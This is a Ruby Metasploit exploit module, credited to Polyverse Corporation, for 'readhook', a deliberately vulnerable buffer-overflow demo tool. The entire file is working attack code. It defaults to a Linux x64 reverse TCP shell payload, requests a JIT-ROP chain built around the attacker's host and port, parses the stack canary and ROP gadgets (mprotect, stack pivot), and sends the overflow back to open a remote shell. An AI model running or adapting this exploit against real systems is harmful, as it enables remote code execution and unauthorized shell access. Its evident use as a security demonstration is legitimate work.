class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
        Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'           => 'readhook',
                'Description'    => 'Exploit for readhook synthetic buffer overflow tool',
                'Author'         => [ 'Polyverse Corporation' ],
                'License'        => MSF_LICENSE,
                'References'     => [ [ 'URL', 'https://polyverse.com' ], ],
                'Platform'       => [ 'linux' ],
                'Payload'        => { },
                'Arch'           => [ ARCH_X64 ],
                'Targets'        => [ [ 'Linux x64', { 'Arch' => ARCH_X64, } ] ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/shell_reverse_tcp' }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
            OptString.new('READHOOK_BASE_URI', [true, 'The base path for READHOOK magic.', '/xyzzy']),
            OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false]),
            OptInt.new('DEMOTYPE', [false, 'Type of demo: 1-Interactive, 2-Gadget motion loop.', 1])
        ], self.class)
    end

    # Print utility for a header
    def print_header(hdr)
        print_status("-------------------------------------------------------------------")
        print_status("#{hdr}")
        print_status("-------------------------------------------------------------------")
    end

    # Print utility for a separator
    def print_separator()
        print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
    end

    # Endian-sensitive string-to-integer converter
    def str_to_int(str)
        if str.length > 8
            return nil
        end

        n = 0
        for i in 1..str.length
            if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                n = (n << 8) + str[str.length - i].ord
            else
                n = (n << 8) + str[i - 1].ord
            end
        end

        return n
    end

    # Formatter for int to hex string
    def int_to_str16(i)
        return "0x" + i.to_s(16)
    end

    def printable(s)
        return s.gsub(/[^[:print:]]/, ".")
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        def print_parsed(parsed)
            parsed.each do |key, value|
                if key == "pl_scu" then
                  puts "%16s:                    [%s]" % [key, printable(value)]
                else
                  puts "%16s: 0x%016x [%s]" % [key, str_to_int(value), printable(value).reverse()]
                end
            end
        end

        def interact(step, action)
            print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to: #{action}")
            if datastore['INTERACTIVE'] then
                c = gets[0].chomp().downcase()
                exit() if c == 'q'
                return step if c == 'r'
            end

            return step + 1
        end

        # Check for vulnerability
        def checktarget(step)
            begin
                nextstep = interact(step, "Check if target is vulnerable.")
                exit() if check() != Exploit::CheckCode::Vulnerable
            end while nextstep == step

            print_status("Target is vulnerable")

            return nextstep
        end

        # Ask READHOOK for a payload that will give us a reverse shell from the remote host
        def getpayload()
            uri = datastore['READHOOK_BASE_URI'] + "MAKEJROP" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
            res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )
            exit() if !res || res.code != 200
            payload = res.body
                
            print_status("payload:")
            print_status("#{payload}")

            return payload 
        end

        # Given the response from readhook(), extract the bas64 encoded portion of the reply
        def getencoded(raw)
            return raw[datastore['READHOOK_BASE_URI'].length() + "OVERFLOW".length()..-1]
        end

        # Given the base64 encoded payload, decode it
        def decode(encoded)
            return Rex::Text.decode_base64(encoded)
        end

        # Given the decoded payload, parse it into a friendly format
        def parse(decoded)
            parsed = Hash.new
            parsed["sf_dst"]        = decoded[0..7]
            parsed["sf_canary"]     = decoded[8..15]
            parsed["sf_rbp"]        = decoded[16..23]
            parsed["rc_popRDI"]     = decoded[24..31]
            parsed["rc_stackPage"]  = decoded[32..39]
            parsed["rc_popRSI"]     = decoded[40..47]
            parsed["rc_stackSize"]  = decoded[48..55]
            parsed["rc_popRDX"]     = decoded[56..63]
            parsed["rc_permission"] = decoded[64..71]
            parsed["rc_mprotect"]   = decoded[72..79]
            parsed["rc_pivot"]      = decoded[80..87]
            parsed["pl_scu"]        = decoded[88..-1]

            print_status("parsed:")
            print_parsed(parsed)

            return parsed
        end

        # This is for remote debugging
        def dumppayloadremote(step, payload)
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload.gsub("OVERFLOW", "DUMPLOAD") } )
        end

        # Request the buffer overflow and process it for presentation 
        def getoverflow(step)
            begin
                nextstep = interact(step, "Request JITROP payload from readhook.")
                raw     = getpayload()
                encoded = getencoded(raw)
                decoded = decode(encoded)
                parsed  = parse(decoded)
            end while nextstep == step

            return nextstep, raw, encoded, decoded, parsed
        end

        def putoverflow(step, payload)
            step = interact(step, "Send JITROP payload back to server...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload } )

            return step
        end

        # Check that target is vulnerable
        step = checktarget(1)

        if datastore['DEMOTYPE'] == 1 then
            step, raw, encoded, decoded, parsed = getoverflow(step)
            step = putoverflow(step, raw)
        elsif datastore['DEMOTYPE'] == 2 then
            puts "\e[H\e[2J"
            loop do
                step, raw, encoded, decoded, parsed = getoverflow(step)
                puts "\e[H"
            end
        end
 
        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
